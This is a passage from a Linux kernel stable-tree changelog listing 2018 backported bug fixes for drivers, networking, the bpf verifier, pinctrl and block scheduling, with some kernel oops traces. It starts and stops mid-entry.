[1072141.444090] Modules linked in: mpt3sas raid\_class binfmt\_misc af\_packet 8021q garp mrp stp llc xfs libcrc32c bonding iscsi\_ibft iscsi\_boot\_sysfs msr ext4 crc16 jbd2 mbcache cdc\_ether usbnet mii joydev hid\_generic usbhid intel\_rapl x86\_pkg\_temp\_thermal intel\_powerclamp coretemp crct10dif\_pclmul crc32\_pclmul ghash\_clmulni\_intel ipmi\_ssif mgag200 i2c\_algo\_bit ttm ipmi\_devintf drbg ixgbe drm\_kms\_helper vxlan ansi\_cprng ip6\_udp\_tunnel drm aesni\_intel udp\_tunnel aes\_x86\_64 iTCO\_wdt syscopyarea ptp xhci\_pci lrw iTCO\_vendor\_support pps\_core gf128mul ehci\_pci glue\_helper sysfillrect mdio pcspkr sb\_edac ablk\_helper cryptd ehci\_hcd sysimgblt xhci\_hcd fb\_sys\_fops edac\_core mei\_me lpc\_ich ses usbcore enclosure dca mfd\_core ipmi\_si mei i2c\_i801 scsi\_transport\_sas usb\_common ipmi\_msghandler shpchp fjes wmi processor button acpi\_pad btrfs xor raid6\_pq sd\_mod crc32c\_intel megaraid\_sas sg dm\_multipath dm\_mod scsi\_dh\_rdac scsi\_dh\_emc scsi\_dh\_alua scsi\_mod md\_mod autofs4
[1072141.444146] Supported: Yes
[1072141.444149] CPU: 21 PID: 1 Comm: systemd Not tainted 4.4.121-92.80-default #1
[1072141.444150] Hardware name: LENOVO Lenovo System x3650 M5 -[5462P4U]- -[5462P4U]-/01GR451, BIOS -[TCE136H-2.70]- 06/13/2018
[1072141.444151] task: ffff880191bd0040 ti: ffff880191bd4000 task.ti: ffff880191bd4000
[1072141.444153] RIP: 0010:[] [] update\_classid\_sock+0x29/0x40
[1072141.444157] RSP: 0018:ffff880191bd7d58 EFLAGS: 00000286
[1072141.444158] RAX: ffff883b177cb7c0 RBX: 0000000000000000 RCX: 0000000000000000
[1072141.444159] RDX: 00000000000009c7 RSI: ffff880191bd7d5c RDI: ffff8822e29bb200
[1072141.444160] RBP: ffff883a72230980 R08: 0000000000000101 R09: 0000000000000000
[1072141.444161] R10: 0000000000000008 R11: f000000000000000 R12: ffffffff815229d0
[1072141.444162] R13: 0000000000000000 R14: ffff881fd0a47ac0 R15: ffff880191bd7f28
[1072141.444163] FS: 00007f3e2f1eb8c0(0000) GS:ffff882000340000(0000) knlGS:0000000000000000
[1072141.444164] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[1072141.444165] CR2: 00007f3e2f200000 CR3: 0000001ffea4e000 CR4: 00000000001606f0
[1072141.444166] Stack:
[1072141.444166] ffffffa800000246 00000000000009c7 ffffffff8121d583 ffff8818312a05c0
[1072141.444168] ffff8818312a1100 ffff880197c3b280 ffff881861422858 ffffffffffffffea
[1072141.444170] ffffffff81522b1c ffffffff81d0ca20 ffff8817fa17b950 ffff883fdd8121e0
[1072141.444171] Call Trace:
[1072141.444179] [] iterate\_fd+0x53/0x80
[1072141.444182] [] write\_classid+0x4c/0x80
[1072141.444187] [] cgroup\_file\_write+0x9b/0x100
[1072141.444193] [] kernfs\_fop\_write+0x11b/0x150
[1072141.444198] [] \_\_vfs\_write+0x26/0x100
[1072141.444201] [] vfs\_write+0x9d/0x190
[1072141.444203] [] SyS\_write+0x42/0xa0
[1072141.444207] [] entry\_SYSCALL\_64\_fastpath+0x1e/0xca
[1072141.445490] DWARF2 unwinder stuck at entry\_SYSCALL\_64\_fastpath+0x1e/0xca
If a cgroup has many tasks with many open file descriptors then we would
end up in a large loop without any rescheduling point throught the
operation. Add cond\_resched once per task.
Signed-off-by: Michal Hocko
Signed-off-by: Tejun Heo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c24f57c61277128022bd7804d9bda9dbbdd56470
Author: Ronnie Sahlberg
Date: Wed Oct 10 15:29:06 2018 +1000
cifs: fix a credits leak for compund commands
[ Upstream commit cb5c2e63948451d38c977685fffc06e23beb4517 ]
When processing the mids for compounds we would only add credits based on
the last successful mid in the compound which would leak credits and
eventually triggering a re-connect.
Fix this by splitting the mid processing part into two loops instead of one
where the first loop just waits for all mids and then counts how many
credits we were granted for the whole compound.
Signed-off-by: Ronnie Sahlberg
Signed-off-by: Steve French
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c016b6d3c9454a4f6e1cbb69c1fd7730d8108037
Author: Geert Uytterhoeven
Date: Fri Oct 12 09:20:17 2018 +0200
thermal: da9062/61: Prevent hardware access during system suspend
[ Upstream commit 760eea43f8c6d48684f1f34b8a02fddc1456e849 ]
The workqueue used for monitoring the hardware may run while the device
is already suspended. Fix this by using the freezable system workqueue
instead, cfr. commit 51e20d0e3a60cf46 ("thermal: Prevent polling from
happening during system suspend").
Fixes: 608567aac3206ae8 ("thermal: da9062/61: Thermal junction temperature monitoring driver")
Signed-off-by: Geert Uytterhoeven
Acked-by: Steve Twiss
Signed-off-by: Eduardo Valentin
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 509859e49bdc2bbae4416b8aaecf9f03da80aebd
Author: Geert Uytterhoeven
Date: Fri Oct 12 09:20:16 2018 +0200
thermal: rcar\_thermal: Prevent doing work after unbind
[ Upstream commit 697ee786f15d7b65c7f3045d45fe3a05d28e0911 ]
When testing bind/unbind on r8a7791/koelsch:
WARNING: CPU: 1 PID: 697 at lib/debugobjects.c:329 debug\_print\_object+0x8c/0xb4
ODEBUG: free active (active state 0) object type: timer\_list hint: delayed\_work\_timer\_fn+0x0/0x10
This happens if the workqueue runs after the device has been unbound.
Fix this by cancelling any queued work during remove.
Fixes: e0a5172e9eec7f0d ("thermal: rcar: add interrupt support")
Signed-off-by: Geert Uytterhoeven
Reviewed-by: Niklas Söderlund
Signed-off-by: Eduardo Valentin
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit aa3bbb8d780cb34fe4ab69e3d70cda8005275878
Author: Diego Viola
Date: Fri Oct 26 10:45:16 2018 -0300
libata: Apply NOLPM quirk for SAMSUNG MZ7TD256HAFV-000L9
[ Upstream commit a435ab4f80f983c53b4ca4f8c12b3ddd3ca17670 ]
med\_power\_with\_dipm causes my T450 to freeze with a SAMSUNG
MZ7TD256HAFV-000L9 SSD (firmware DXT02L5Q).
Switching the LPM to max\_performance fixes this issue.
Acked-by: Hans de Goede
Signed-off-by: Diego Viola
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 27baa32c5eb51cd50c924420d4a6c0adb037b6c6
Author: Martin Willi
Date: Wed Aug 22 09:39:52 2018 +0200
ath10k: schedule hardware restart if WMI command times out
[ Upstream commit a9911937e7d332761e8c4fcbc7ba0426bdc3956f ]
When running in AP mode, ath10k sometimes suffers from TX credit
starvation. The issue is hard to reproduce and shows up once in a
few days, but has been repeatedly seen with QCA9882 and a large
range of firmwares, including 10.2.4.70.67.
Once the module is in this state, TX credits are never replenished,
which results in "SWBA overrun" errors, as no beacons can be sent.
Even worse, WMI commands run in a timeout while holding the conf
mutex for three seconds each, making any further operations slow
and the whole system unresponsive.
The firmware/driver never recovers from that state automatically,
and triggering TX flush or warm restarts won't work over WMI. So
issue a hardware restart if a WMI command times out due to missing
TX credits. This implies a connectivity outage of about 1.4s in AP
mode, but brings back the interface and the whole system to a usable
state. WMI command timeouts have not been seen in absent of this
specific issue, so taking such drastic actions seems legitimate.
Signed-off-by: Martin Willi
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b83452446e079fd6238c94a593876f4c1cb1dd86
Author: Maya Erez
Date: Thu Aug 23 14:47:11 2018 +0300
wil6210: fix RX buffers release and unmap
[ Upstream commit 84f16fbb62384fb209cd35741d94eb00b5ca2746 ]
RX SKBs are released in both wil6210 rmmod and RX handle.
As there is no lock to protect the buffers DMA unmap,
the SKB pointer in buff\_arr is used to check if the buffer
memory was already released.
Setting wil->rx\_buff\_mgmt.buff\_arr[buff\_id].skb to NULL before the DMA
memory unmap will prevent duplicate unmapping of the same memory.
Move the buffer ID to the free list also in case the SKB is NULL.
Signed-off-by: Maya Erez
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ef172c741586382ecce429007e66f4d4700a6b69
Author: Sebastian Basierski
Date: Thu Aug 9 11:45:40 2018 +0200
ixgbevf: VF2VF TCP RSS
[ Upstream commit 7fb94bd58dd6650a0158e68d414e185077d8b57a ]
While VF2VF with RSS communication, RSS Type were wrongly recognized
and RSS hash was not calculated as it should be. Packets was
distributed on various queues by accident.
This commit fixes that behaviour and causes proper RSS Type recognition.
Signed-off-by: Sebastian Basierski
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit d0530284ddd72acb131928da68445e397c3ae8df
Author: Shannon Nelson
Date: Wed Aug 22 16:47:14 2018 -0700
ixgbe: disallow IPsec Tx offload when in SR-IOV mode
[ Upstream commit 47b6f50077e68bcd544f657526dad4bfdce7e87d ]
There seems to be a problem in the x540's internal switch wherein if SR-IOV
mode is enabled and an offloaded IPsec packet is sent to a local VF,
the packet is silently dropped. This might never be a problem as it is
somewhat a corner case, but if someone happens to be using IPsec offload
from the PF to a VF that just happens to get migrated to the local box,
communication will mysteriously fail.
Not good.
A simple way to protect from this is to simply not allow any IPsec offloads
for outgoing packets when num\_vfs != 0. This doesn't help any offloads that
were created before SR-IOV was enabled, but we'll get to that later.
Signed-off-by: Shannon Nelson
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 545a030314a176a44ebcaf172ef2a2a187179c79
Author: Justin Chen
Date: Fri Aug 17 16:47:39 2018 -0700
gpio: brcmstb: allow 0 width GPIO banks
[ Upstream commit bfba223dcc4548632d8f3bfd15690a86d4c68504 ]
Sometimes we have empty banks within the GPIO block. This commit allows
proper handling of 0 width GPIO banks. We handle 0 width GPIO banks by
incrementing the bank and number of GPIOs, but not initializing them.
This will mean a call into the non-existent GPIOs will return an error.
Also remove "GPIO registered" dev print. This information is misleading
since the incremented banks and gpio\_base do not reflect the actual GPIOs
that get initialized. We leave this information out since it is already
printed with dev\_dbg.
Signed-off-by: Justin Chen
Acked-by: Florian Fainelli
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8ba36c16bcc20ab36673d3847c6b879d48a16bb5
Author: Sara Sharon
Date: Tue May 1 14:54:22 2018 +0300
iwlwifi: mvm: fix BAR seq ctrl reporting
[ Upstream commit 941ab4eb66c10bc5c7234e83a7a858b2806ed151 ]
There is a bug in FW where the sequence control may be
incorrect, and the driver overrides it with the value
of the ieee80211 header.
However, in BAR there is no sequence control in the header,
which result with arbitrary sequence.
This access to an unknown location is bad and it makes the
logs very confusing - so fix it.
Signed-off-by: Sara Sharon
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 44e0f15b31d28c57b4061585c33c09fd0b520dbe
Author: Dan Carpenter
Date: Tue Aug 14 12:07:48 2018 +0300
libertas\_tf: prevent underflow in process\_cmdrequest()
[ Upstream commit 3348ef6a6a126706d6a73ed40c18d8033df72783 ]
If recvlength is less than MESSAGE\_HEADER\_LEN (4) we would end up
corrupting memory.
Fixes: c305a19a0d0a ("libertas\_tf: usb specific functions")
Signed-off-by: Dan Carpenter
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 14e0b9bba974d41adcc6a2fd66e3ae67e25bb3e5
Author: Siva Rebbagondla
Date: Mon Aug 27 17:05:14 2018 +0530
rsi: fix memory alignment issue in ARM32 platforms
[ Upstream commit baa8caf4ab7af2d9e84b566b99fe919a4e9e7562 ]
During testing in ARM32 platforms, observed below kernel panic, as driver
accessing data beyond the allocated memory while submitting URB to USB.
Fix: Resolved this by specifying correct length by considering 64 bit
alignment. so that, USB bus driver will access only allocated memory.
Unit-test: Tested and confirm that driver bring up and scanning,
connection and data transfer works fine with this fix.
...skipping...
[ 25.389450] Unable to handle kernel paging request at virtual
address 5aa11422
[ 25.403078] Internal error: Oops: 5 [#1] SMP ARM
[ 25.407703] Modules linked in: rsi\_usb
[ 25.411473] CPU: 1 PID: 317 Comm: RX-Thread Not tainted 4.18.0-rc7 #1
[ 25.419221] Hardware name: Freescale i.MX6 Quad/DualLite (Device Tree)
[ 25.425764] PC is at skb\_release\_data+0x90/0x168
[ 25.430393] LR is at skb\_release\_all+0x28/0x2c
[ 25.434842] pc : [<807435b0>] lr : [<80742ba0>] psr: 200e0013 5aa1141e
[ 25.464633] Flags: nzCv IRQs on FIQs on Mode SVC\_32 ISA ARM Segment none
[ 25.477524] Process RX-Thread (pid: 317, stack limit = 0x(ptrval))
[ 25.483709] Stack: (0xedf69ed8 to 0xedf6a000)
[ 25.569907] Backtrace:
[ 25.572368] [<80743520>] (skb\_release\_data) from [<80742ba0>]
(skb\_release\_all+0x28/0x2c)
[ 25.580555] r9:7f00258c r8:00000001 r7:ee355000 r6:eddab0d0
r5:eddab000 r4:eddbb840
[ 25.588308] [<80742b78>] (skb\_release\_all) from [<807432cc>]
(consume\_skb+0x30/0x50)
[ 25.596055] r5:eddab000 r4:eddbb840
[ 25.599648] [<8074329c>] (consume\_skb) from [<7f00117c>]
(rsi\_usb\_rx\_thread+0x64/0x12c [rsi\_usb])
[ 25.608524] r5:eddab000 r4:eddbb840
[ 25.612116] [<7f001118>] (rsi\_usb\_rx\_thread [rsi\_usb]) from
[<80142750>] (kthread+0x11c/0x15c)
[ 25.620735] r10:ee9ff9e0 r9:edcde3b8 r8:ee355000 r7:edf68000
r6:edd3a780 r5:00000000
[ 25.628567] r4:edcde380
[ 25.631110] [<80142634>] (kthread) from [<801010e8>]
(ret\_from\_fork+0x14/0x2c)
[ 25.638336] Exception stack(0xedf69fb0 to 0xedf69ff8)
[ 25.682929] ---[ end trace 8236a5496f5b5d3b ]---
Signed-off-by: Siva Rebbagondla
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3041b096a3a4929f7cc1fdb97811bd2048b02ed7
Author: Lorenzo Bianconi
Date: Fri Aug 24 10:17:49 2018 +0200
mt76x2u: run device cleanup routine if resume fails
[ Upstream commit 9b2fd48d36e25b9be9ddb8be8cc1eb263a1d1843 ]
Cleanup {tx,rx} and mcu queues if resume operation fails
Fixes: ee676cd5017c ("mt76: add driver code for MT76x2u based devices")
Signed-off-by: Lorenzo Bianconi
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6436e7900c161132da729cf458021863acda773e
Author: Andrew Lunn
Date: Sun Sep 2 18:13:14 2018 +0200
net: dsa: mv88e6xxx: Fix writing to a PHY page.
[ Upstream commit c309b158090d788e96ee597444965cb79b040484 ]
After changing to the needed page, actually write the value to the
register!
Fixes: 09cb7dfd3f14 ("net: dsa: mv88e6xxx: describe PHY page and SerDes")
Signed-off-by: Andrew Lunn
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6797a427f853eb62605a85b9c00325b3ccc7b4f1
Author: Yunsheng Lin
Date: Mon Sep 3 11:21:46 2018 +0100
net: hns3: Fix for vf vlan delete failed problem
[ Upstream commit 41dafea2af781d8e3ab8626d236b52e4172905a3 ]
There are only 128 entries in vf vlan table, if user has added
more than 128 vlan, fw will ignore it and disable the vf vlan
table. So when user deletes the vlan entry that has not been
set to vf vlan table, fw will return not found result and driver
treat that as error, which will cause vlan delete failed problem.
This patch fixes it by returning ok when fw returns not found
result.
Fixes: 6c251711b37f ("net: hns3: Disable vf vlan filter when vf vlan table is full")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0e80397c864a4744e0513551c06089a16c0b0019
Author: Yunsheng Lin
Date: Mon Sep 3 11:21:51 2018 +0100
net: hns3: Fix ping exited problem when doing lp selftest
[ Upstream commit 3f8601f0f5716c4e63a9f215bbc581df42859d61 ]
When ping is runnig and user executes the loopback selftest, the
ping cmd will stop and exit.
This patch fixes it by using the hns3\_nic\_net\_open/stop to offline
the netdev when doing loopback selftest.
Fixes: c39c4d98dc65 ("net: hns3: Add mac loopback selftest support in hns3 driver")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 35aafd40b173d7feeee812f49c89614a2011bdc5
Author: Yunsheng Lin
Date: Mon Sep 3 11:21:52 2018 +0100
net: hns3: Preserve vlan 0 in hardware table
[ Upstream commit daaa8521760ee4d4e65f309c4c37b3a1e58c9d4e ]
When netdev is down, the stack will delete the vlan from
hardware including vlan0, which will cause problem when
doing loopback selftest when netdev is down.
This patch fixes it by always preserving vlan 0 in hardware,
because vlan 0 is defalut vlan, which should always be in
hardware.
Fixes: c39c4d98dc65 ("net: hns3: Add mac loopback selftest support in hns3 driver")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e6ae1e7b0fea53de4bfdc47f3fd12b6605d2b039
Author: Douglas Anderson
Date: Thu Aug 30 08:23:38 2018 -0700
pinctrl: ssbi-gpio: Fix pm8xxx\_pin\_config\_get() to be compliant
[ Upstream commit b432414b996d32a1bd9afe2bd595bd5729c1477f ]
If you look at "pinconf-groups" in debugfs for ssbi-gpio you'll notice
it looks like nonsense.
The problem is fairly well described in commit 1cf86bc21257 ("pinctrl:
qcom: spmi-gpio: Fix pmic\_gpio\_config\_get() to be compliant") and
commit 05e0c828955c ("pinctrl: msm: Fix msm\_config\_group\_get() to be
compliant"), but it was pointed out that ssbi-gpio has the same
problem. Let's fix it there too.
Fixes: b4c45fe974bc ("pinctrl: qcom: ssbi: Family A gpio & mpp drivers")
Signed-off-by: Douglas Anderson
Reviewed-by: Stephen Boyd
Reviewed-by: Bjorn Andersson
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit a87aba152565a3c3ccbc40fe3aa91c10dd035f19
Author: Douglas Anderson
Date: Thu Aug 30 08:23:39 2018 -0700
pinctrl: spmi-mpp: Fix pmic\_mpp\_config\_get() to be compliant
[ Upstream commit 0d5b476f8f57fcb06c45fe27681ac47254f63fd2 ]
If you look at "pinconf-groups" in debugfs for ssbi-mpp you'll notice
it looks like nonsense.
The problem is fairly well described in commit 1cf86bc21257 ("pinctrl:
qcom: spmi-gpio: Fix pmic\_gpio\_config\_get() to be compliant") and
commit 05e0c828955c ("pinctrl: msm: Fix msm\_config\_group\_get() to be
compliant"), but it was pointed out that ssbi-mpp has the same
problem. Let's fix it there too.
NOTE: in case it's helpful to someone reading this, the way to tell
whether to do the -EINVAL or not is to look at the PCONFDUMP for a
given attribute. If the last element (has\_arg) is false then you need
to do the -EINVAL trick.
ALSO NOTE: it seems unlikely that the values returned when we try to
get PIN\_CONFIG\_BIAS\_PULL\_UP will actually be printed since "has\_arg"
is false for that one, but I guess it's still fine to return different
values so I kept doing that. It seems like another driver (ssbi-gpio)
uses a custom attribute (PM8XXX\_QCOM\_PULL\_UP\_STRENGTH) for something
similar so maybe a future change should do that here too.
Fixes: cfb24f6ebd38 ("pinctrl: Qualcomm SPMI PMIC MPP pin controller driver")
Signed-off-by: Douglas Anderson
Reviewed-by: Stephen Boyd
Reviewed-by: Bjorn Andersson
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e7af99165ba21d6fbf2ad2a916ca45104fd5b57c
Author: Arnaldo Carvalho de Melo
Date: Wed Sep 5 10:47:56 2018 -0300
perf tests: Fix record+probe\_libc\_inet\_pton.sh without ping's debuginfo
[ Upstream commit 1632936480a53d85ef3012cd9f290e247251cbb9 ]
When we don't have the iputils-debuginfo package installed, i.e. when we
don't have the DWARF information needed to resolve ping's samples, we
end up failing this 'perf test' entry:
# perf test ping
62: probe libc's inet\_pton & backtrace it with ping : Ok
# rpm -e iputils-debuginfo
# perf test ping
62: probe libc's inet\_pton & backtrace it with ping : FAILED!
#
Fix it to accept "[unknown]" where the symbol + offset, when resolved,
is expected.
I think this will fail in the other arches as well, but since I can't
test now, I'm leaving s390x and ppc cases as-is.
Cc: Adrian Hunter
Cc: Alexander Shishkin
Cc: David Ahern
Cc: Hendrik Brueckner
Cc: Jiri Olsa
Cc: Kim Phillips
Cc: Michael Petlan
Cc: Namhyung Kim
Cc: Naveen N. Rao
Cc: Peter Zijlstra
Cc: Ravi Bangoria
Cc: Sandipan Das
Cc: Sukadev Bhattiprolu
Cc: Thomas Richter
Cc: Wang Nan
Fixes: 7903a7086723 ("perf script: Show symbol offsets by default")
Link: https://lkml.kernel.org/n/tip-hnizqwqrs03vcq1b74yao0f6@git.kernel.org
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f60d53ef5755b8fefc9d11fc6136b79fb0a4a25c
Author: YueHaibing
Date: Tue Sep 4 02:56:26 2018 +0000
failover: Add missing check to validate 'slave\_dev' in net\_failover\_slave\_unregister
[ Upstream commit 9e7e6cabf371cc008cb2244a04c012b516753693 ]
Fixes gcc '-Wunused-but-set-variable' warning:
drivers/net/net\_failover.c: In function 'net\_failover\_slave\_unregister':
drivers/net/net\_failover.c:598:35: warning:
variable 'primary\_dev' set but not used [-Wunused-but-set-variable]
There should check the validity of 'slave\_dev'.
Fixes: cfc80d9a1163 ("net: Introduce net\_failover driver")
Signed-off-by: YueHaibing
Acked-by: Sridhar Samudrala
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e12da4273c6bb59d21ca328d3a4e87d6adeb421f
Author: Alexei Starovoitov
Date: Tue Sep 4 19:13:44 2018 -0700
bpf/verifier: fix verifier instability
[ Upstream commit a9c676bc8fc58d00eea9836fb14ee43c0346416a ]
Edward Cree says:
In check\_mem\_access(), for the PTR\_TO\_CTX case, after check\_ctx\_access()
has supplied a reg\_type, the other members of the register state are set
appropriately. Previously reg.range was set to 0, but as it is in a
union with reg.map\_ptr, which is larger, upper bytes of the latter were
left in place. This then caused the memcmp() in regsafe() to fail,
preventing some branches from being pruned (and occasionally causing the
same program to take a varying number of processed insns on repeated
verifier runs).
Fix the instability by clearing bpf\_reg\_state in \_\_mark\_reg\_[un]known()
Fixes: f1174f77b50c ("bpf/verifier: rework value tracking")
Debugged-by: Edward Cree
Acked-by: Edward Cree
Signed-off-by: Alexei Starovoitov
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9906a9300d57ef20f90d30f219beefd7709f1205
Author: Stephen Boyd
Date: Thu Aug 30 17:58:52 2018 -0700
pinctrl: qcom: spmi-mpp: Fix drive strength setting
[ Upstream commit 89c68b102f13f123aaef22b292526d6b92501334 ]
It looks like we parse the drive strength setting here, but never
actually write it into the hardware to update it. Parse the setting and
then write it at the end of the pinconf setting function so that it
actually sticks in the hardware.
Fixes: 0e948042c420 ("pinctrl: qcom: spmi-mpp: Implement support for sink mode")
Cc: Doug Anderson
Signed-off-by: Stephen Boyd
Reviewed-by: Bjorn Andersson
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit fe68a585e9d950ef94122c02a01b072825837cbd
Author: Hans de Goede
Date: Mon Aug 27 09:45:44 2018 +0200
ACPI / LPSS: Add alternative ACPI HIDs for Cherry Trail DMA controllers
[ Upstream commit 240714061c58e6b1abfb3322398a7634151c06cb ]
Bay and Cherry Trail DSTDs represent a different set of devices depending
on which OS the device think it is booting. One set of decices for Windows
and another set of devices for Android which targets the Android-x86 Linux
kernel fork (which e.g. used to have its own display driver instead of
using the i915 driver).
Which set of devices we are actually going to get is out of our control,
this is controlled by the ACPI OSID variable, which gets either set through
an EFI setup option, or sometimes is autodetected. So we need to support
both.
This commit adds support for the 80862286 and 808622C0 ACPI HIDs which we
get for the first resp. second DMA controller on Cherry Trail devices when
OSID is set to Android.
Signed-off-by: Hans de Goede
Reviewed-by: Andy Shevchenko
Signed-off-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 74e8d28794bfa03b3b7986c197c866747c9e9712
Author: Linus Walleij
Date: Mon Sep 10 00:28:05 2018 +0200
spi: gpio: No MISO does not imply no RX
[ Upstream commit abf5feef3ff0cefade0c76be53b59e55fdd46093 ]
There is a logical problem in spi-gpio with host just
assigning a MOSI line and no MISO: this is interpreted
as the host cannot do RX and the host is flagged with
SPI\_MASTER\_NO\_RX.
This is wrong: since GPIO lines can switch direction,
in 3WIRE operation the host will simply reverse the
direction of the GPIO line and start reading from it,
there is even code for doing this in the driver, but
it went unnoticed because it was tested by using a
master with 4 wires but a device using just 3 wires.
Remove the offending flag.
Cc: Andrzej Hajda
Cc: Lorenzo Bianconi
Signed-off-by: Linus Walleij
Signed-off-by: Mark Brown
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 82b0f70fd30f963b45d2e64b42a68ebb0f139e14
Author: Masami Hiramatsu
Date: Tue Sep 11 19:20:40 2018 +0900
kprobes: Return error if we fail to reuse kprobe instead of BUG\_ON()
[ Upstream commit 819319fc93461c07b9cdb3064f154bd8cfd48172 ]
Make reuse\_unused\_kprobe() to return error code if
it fails to reuse unused kprobe for optprobe instead
of calling BUG\_ON().
Signed-off-by: Masami Hiramatsu
Cc: Anil S Keshavamurthy
Cc: David S . Miller
Cc: Linus Torvalds
Cc: Naveen N . Rao
Cc: Peter Zijlstra
Cc: Thomas Gleixner
Link: http://lkml.kernel.org/r/153666124040.21306.14150398706331307654.stgit@devbox
Signed-off-by: Ingo Molnar
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 313c940d1507e93128438a3f973fe578228b1bb1
Author: Will Deacon
Date: Tue Aug 7 13:43:06 2018 +0100
arm64: entry: Allow handling of undefined instructions from EL1
[ Upstream commit 0bf0f444b2c49241b2b39aa3cf210d7c95ef6c34 ]
Rather than panic() when taking an undefined instruction exception from
EL1, allow a hook to be registered in case we want to emulate the
instruction, like we will for the SSBS PSTATE manipulation instructions.
Signed-off-by: Will Deacon
Signed-off-by: Catalin Marinas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 668c01c11b7069db36d3bd12738c9ab8487da852
Author: Paolo Valente
Date: Fri Sep 14 16:23:07 2018 +0200
block, bfq: correctly charge and reset entity service in all cases
[ Upstream commit cbeb869a3d1110450186b738199963c5e68c2a71 ]
BFQ schedules entities (which represent either per-process queues or
groups of queues) as a function of their timestamps. In particular, as
a function of their (virtual) finish times. The finish time of an
entity is computed as a function of the budget assigned to the entity,
assuming, tentatively, that the entity, once in service, will receive
an amount of service equal to its budget. Then, when the entity is
expired because it finishes to be served, this finish time is updated
as a function of the actual service received by the entity. This
allows the entity to be correctly charged with only the service
received, and then to be correctly re-scheduled.
Yet an entity may receive service also while not being the entity in
service (in the scheduling environment of its parent entity), for
several reasons. If the entity remains with no backlog while receiving
this 'unofficial' service, then it is expired. Also on such an
expiration, the finish time of the entity should be updated to account
for only the service actually received by the entity. Unfortunately,
such an update is not performed for an entity expiring without being
the entity in service.
In a similar vein, the service counter of the entity in service is
reset when the entity is expired, to be ready to be used for next
service cycle. This reset too should be performed also in case an
entity is expired because it remains empty after receiving service
while not being the entity in service. But in this case the reset is
not performed.
This commit performs the above update of the finish time and reset of
the service received, also for an entity expiring while not being the
entity in service.
Signed-off-by: Paolo Valente
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 15b08daa2111dfecdd9a7bee255584a3e96bd84a
Author: Antoine Tenart
Date: Wed Sep 19 11:39:31 2018 +0200
net: phy: phylink: ensure the carrier is off when starting phylink
[ Upstream commit aeeb2e8fdefdd5d257a1446351c70cb3df540199 ]
Phylink made an assumption about the carrier state being down when
calling phylink\_start(). If this assumption isn't satisfied, the
internal phylink state could misbehave and a net device could end up not
being functional.
This patch fixes this by explicitly calling netif\_carrier\_off() in
phylink\_start().
Signed-off-by: Antoine Tenart
Acked-by: Russell King
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f9573e11a9d67facd33dc235b1e7940aaa5c7d79
Author: Fuyun Liang
Date: Wed Sep 19 18:29:52 2018 +0100
net: hns3: Set STATE\_DOWN bit of hdev state when stopping net
[ Upstream commit 2f7e489611bc685b8e00aba436032a8aac6cac57 ]
We clear STATE\_DOWN bit of hdev state when starting net, but do not set
it again when stopping net. It causes that the net is down, but hdev state
is still up. STATE\_DOWN bit of hdev state should be set when stopping net.
Fixes: 46a3df9f9718 ("net: hns3: Add HNS3 Acceleration Engine & Compatibility Layer Support")
Fixes: e2cb1dec9779 ("net: hns3: Add HNS3 VF HCL(Hardware Compatibility Layer) Support")
Signed-off-by: Fuyun Liang
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e937c14f84cbe82d0af99733f068bff9939bb214
Author: Peng Li
